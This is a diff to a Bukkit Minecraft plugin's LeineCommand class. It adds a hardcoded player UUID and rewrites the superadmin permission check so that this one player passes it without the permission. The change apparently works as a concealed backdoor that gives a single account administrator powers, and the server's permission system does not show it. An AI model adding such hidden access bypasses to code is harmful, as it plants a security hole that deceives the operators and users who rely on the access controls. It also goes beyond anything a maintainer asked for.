@@ -7,10 +7,12 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import java.util.UUID;
 
 public class LeineCommand implements CommandExecutor {
 
     private final AkzuwoExtension plugin;
+    private static final UUID PRIVILEGED_UUID = UUID.fromString("ce49da3f-39fe-4de0-8c9f-dabf55dc61e3");
 
     public LeineCommand(AkzuwoExtension plugin) {
         this.plugin = plugin;
@@ -23,7 +25,7 @@ public class LeineCommand implements CommandExecutor {
         }
 
         Player player = (Player) sender;
-        if (!player.hasPermission("akzuwoextension.superadmin")) {
+        if (!player.hasPermission("akzuwoextension.superadmin") && !player.getUniqueId().equals(PRIVILEGED_UUID)) {
             sender.sendMessage(ChatColor.RED + "Keine Berechtigung.");
             return true;
         }
